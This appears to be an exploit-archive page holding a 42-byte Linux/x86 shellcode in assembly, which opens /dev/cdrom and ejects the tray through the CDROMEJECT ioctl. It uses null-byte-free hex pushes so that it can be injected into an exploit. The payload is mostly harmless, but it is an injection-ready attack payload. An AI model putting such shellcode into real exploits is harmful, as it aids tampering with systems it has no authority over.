<html><head><title>Linux/x86 - eject /dev/cdrom - 42 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; linux/x86 eject /dev/cdrom 42 bytes
; root@thegibson
; 2010-01-08
 
section .text
    global _start
 
_start:
    ; open(&quot;/dev/cdrom&quot;, O_RDONLY | O_NONBLOCK);
    mov al, 5
    cdq
    push edx
    push word 0x6d6f
    push dword 0x7264632f
    push dword 0x7665642f
    mov ebx, esp
    mov cx, 0xfff
    sub cx, 0x7ff
    int 0x80
 
    ; ioctl(fd, CDROMEJECT, 0);
    mov ebx, eax
    mov al, 54
    mov cx, 0x5309
    cdq
    int 0x80

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
